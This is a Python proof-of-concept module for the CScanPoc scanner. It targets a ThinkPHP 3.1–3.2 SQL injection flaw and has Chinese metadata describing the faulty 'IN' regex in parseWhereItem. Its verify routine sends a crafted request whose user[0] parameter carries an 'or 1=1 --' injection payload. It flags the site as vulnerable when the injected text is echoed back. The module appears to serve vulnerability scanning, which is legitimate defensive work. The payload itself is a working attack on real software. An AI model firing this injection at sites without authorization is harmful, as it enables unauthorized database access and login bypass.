# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ThinkPHP_0012'  # 平台漏洞编号，留空
    name = 'ThinkPHP 3.1-3.2 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-29'  # 漏洞公布时间
    desc = '''
        官方补丁(DB.class.php parseWhereItem($key,$val))
        preg_match('/IN/i',$val[0]) //该正则没有起始符和终止符，xxxxinxxxxx等任意包含in的字符串都可以匹配成功，因而构成了注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2701/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkPHP'  # 漏洞应用名称
    product_version = 'ThinkPHP 3.1-3.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c1204b6c-c706-451e-a68b-2a9b3b2d8631'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/?user[0]=in%20(%27xx%27))%20or%201=1%20--%20&pass=admin'
            url = self.target + payload
            r = requests.get(url)

            if "in ('xx')) or 1=1 -- " in r.text and '(length=21)' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
